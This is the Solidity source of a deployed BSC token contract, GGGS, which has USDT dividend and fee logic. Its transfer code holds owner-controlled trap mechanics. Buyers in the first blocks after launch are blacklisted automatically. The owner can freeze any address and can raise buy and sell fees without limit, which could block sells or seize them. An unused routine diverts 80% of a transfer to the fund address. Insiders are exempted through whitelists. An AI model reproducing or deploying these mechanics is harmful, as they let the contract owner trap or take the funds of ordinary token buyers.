/**
 *Submitted for verification at BscScan.com on 2023-01-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor(address token) {
        IERC20(token).approve(msg.sender, uint256(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public deadAddress = address(0x000000000000000000000000000000000000dEaD);
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;

    uint256 private _tTotal;
    uint256 public maxTXAmount;
    uint256 public maxWalletAmount;

    ISwapRouter public _swapRouter;
    address public _USDT;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 200;
    uint256 public _buyLPDividendFee = 500;

    uint256 public _sellLPDividendFee = 500;
    uint256 public _sellFundFee = 300;

    uint256 public startTradeBlock;

    address public _mainPair;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(
        address RouterAddress,
        address USDTAddress,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply,
        address FundAddress,
        address ReceiveAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(address(swapRouter), MAX);

        _USDT = USDTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10**Decimals;
        maxTXAmount = 2000 * 10**Decimals;
        maxWalletAmount = 2000 * 10**Decimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0x0), ReceiveAddress, total);

        fundAddress = FundAddress;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[deadAddress] = true;

        holderRewardCondition = 1 * 10**IERC20(USDTAddress).decimals();

        _tokenDistributor = new TokenDistributor(USDTAddress);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 killBlock = 3;

    function setkillBlock(uint256 kill) external onlyOwner {
        killBlock = kill;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = (balance * 999) / 1000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

        bool takeFee = true;
        bool isSell;
        if (_feeWhiteList[from] || _feeWhiteList[to]) takeFee = false;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                require(isL, "Trade Not Open Yet!!");

                if (block.number <= startTradeBlock + killBlock) {
                    if (_swapPairList[from]) {
                        _blackList[to] = true;
                    }
                }

                if (_swapPairList[from]) {
                    lastBuyTime[to] = block.timestamp;
                }

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee +
                                _buyLPDividendFee +
                                _sellFundFee +
                                _sellLPDividendFee;
                            uint256 numTokensSellToFund = (amount * swapFee) /
                                5000;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);

        if (_swapPairList[from]) {
            if (holderIndex[to] == 0) addHolder(to);
        }

        if (
            !_feeWhiteList[from] && (_buyLPDividendFee + _sellLPDividendFee) > 0
        ) processReward(rewardGas);
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * 80) / 100;
        _takeTransfer(sender, fundAddress, feeAmount);
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    bool whiteModeOn = true;
    mapping (address=>bool) public whiteBuy;
    uint256 public whiteBuyFee = 200;
    uint256 public whiteSellFee = 200;

    function addWhiteBuy(address[] memory whiteBuyList) external onlyOwner {
        for(uint256 i=0;i < whiteBuyList.length;i++) {
            whiteBuy[whiteBuyList[i]] = true;
        }
    }

    function setWhiteMode(bool modeOn) external onlyOwner {
        whiteModeOn = modeOn;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            if (!_swapPairList[recipient])
                require(tAmount + balanceOf(recipient) <= maxWalletAmount);

            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPDividendFee;
            } else {
                require(tAmount <= maxTXAmount);
                swapFee = _buyFundFee + _buyLPDividendFee;
                if (whiteBuy[recipient] && whiteModeOn) swapFee = whiteBuyFee;
            }
            uint256 swapAmount = (tAmount * swapFee) / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(sender, address(this), swapAmount);
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee)
        private
        lockTheSwap
    {
        swapFee += swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _USDT;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        IERC20 USDT = IERC20(_USDT);
        uint256 USDTBalance = USDT.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = (USDTBalance * (_buyFundFee + _sellFundFee) * 2) /
            swapFee;
        if (fundAmount > USDTBalance) fundAmount = USDTBalance;
        USDT.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        if (USDTBalance > fundAmount)
            USDT.transferFrom(
                address(_tokenDistributor),
                address(this),
                USDTBalance - fundAmount
            );
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }

    function setBuyFees(uint256 fundFee, uint256 dividendFee) external onlyOwner {
        _buyFundFee = fundFee;
        _buyLPDividendFee = dividendFee;
    }

    function setSellFees(uint256 fundFee, uint256 dividendFee) external onlyOwner {
        _sellFundFee = fundFee;
        _sellLPDividendFee = dividendFee;
    }


    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }

    function setMaxTxAmount(uint256 max) public onlyOwner {
        maxTXAmount = max;
    }

    function setMaxWalletAmount(uint256 max) public onlyOwner {
        maxWalletAmount = max;
    }

    bool public isL = false;

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        isL = true;
        startTradeBlock = block.number;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setMultiFeeWhiteList(address[] memory addr, bool enable)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addr.length; i++)
            _feeWhiteList[addr[i]] = enable;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function setMultiBlackList(address[] memory addr, bool enable)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addr.length; i++) _blackList[addr[i]] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(
        address token,
        uint256 amount,
        address to
    ) external {
        require(_owner == msg.sender || fundAddress == msg.sender, "!Funder");
        IERC20(token).transfer(to, amount);
    }

    receive() external payable {}

    address[] public holders;

    mapping(address => uint256) public holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolderManual(address adr) external onlyOwner {
        holderIndex[adr] = holders.length;
        holders.push(adr);
    }

    function addMultiHolderManual(address[] memory adr) external onlyOwner {
        for (uint256 i = 0; i < adr.length; i++) {
            holderIndex[adr[i]] = holders.length;
            holders.push(adr[i]);
        }
    }

    function addHolder(address adr) private {
        uint256 size;
        assembly {
            size := extcodesize(adr)
        }
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 public currentIndex;
    uint256 public holderRewardCondition;
    uint256 public progressRewardBlock;
    uint256 public rewardBlock = 10;
    uint256 public rewardGas = 500000;

    uint256 public rewardThreshold1 = 1000 * (10**6);
    uint256 public rewardThreshold2 = 10000 * (10**6);
    uint256 public rewardThreshold3 = 20000 * (10**6);

    uint256 public timeIntervalForReward = 86400;
    mapping(address => uint256) public lastBuyTime;

    function setTimeIntervalForReward(uint256 amount) external onlyOwner {
        timeIntervalForReward = amount;
    }

    function setRewardBlock(uint256 amount) external onlyOwner {
        rewardBlock = amount;
    }

    function setRewardThresholdList(
        uint256 amount1,
        uint256 amount2,
        uint256 amount3
    ) external onlyOwner {
        rewardThreshold1 = amount1;
        rewardThreshold2 = amount2;
        rewardThreshold3 = amount3;
    }

    function processReward(uint256 gas) private {
        if (progressRewardBlock + rewardBlock > block.number) {
            return;
        }

        IERC20 USDT = IERC20(_USDT);

        uint256 balance = USDT.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(address(this));

        uint256 holdTokenTotal = holdToken.totalSupply();

        if (holdToken.balanceOf(deadAddress) != 0)
            holdTokenTotal = holdToken.totalSupply() - holdToken.balanceOf(deadAddress);

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);

            if (!excludeHolder[shareHolder] && tokenBalance >= rewardThreshold1) {
                if (
                    (block.timestamp - lastBuyTime[shareHolder]) <=
                    timeIntervalForReward ||
                    _feeWhiteList[shareHolder]
                ) {
                    if (
                        tokenBalance >= rewardThreshold1 &&
                        tokenBalance < rewardThreshold2
                    ) {
                        amount =
                            ((balance * tokenBalance * 3) / 5) /
                            holdTokenTotal;
                    }

                    if (
                        tokenBalance >= rewardThreshold2 &&
                        tokenBalance < rewardThreshold3
                    ) {
                        amount =
                            ((balance * tokenBalance * 4) / 5) /
                            holdTokenTotal;
                    }

                    if (tokenBalance >= rewardThreshold3) {
                        amount = (balance * tokenBalance) / holdTokenTotal;
                    }
                }

                if (amount > 0) {
                    USDT.transfer(shareHolder, amount);
                    amount = 0;
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }
}

contract GGGS is AbsToken {
    constructor()
        AbsToken(
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
            address(0x55d398326f99059fF775485246999027B3197955),
            "GGGS",
            "GGGS",
            6,
            1000000000,
            address(0x6A2D83aDF231a848104Be96741049C6bE8B00877),
            address(0xc106A6b28746433BD002c2DC16c7458fB1c6bF2B)
        )
    {}
}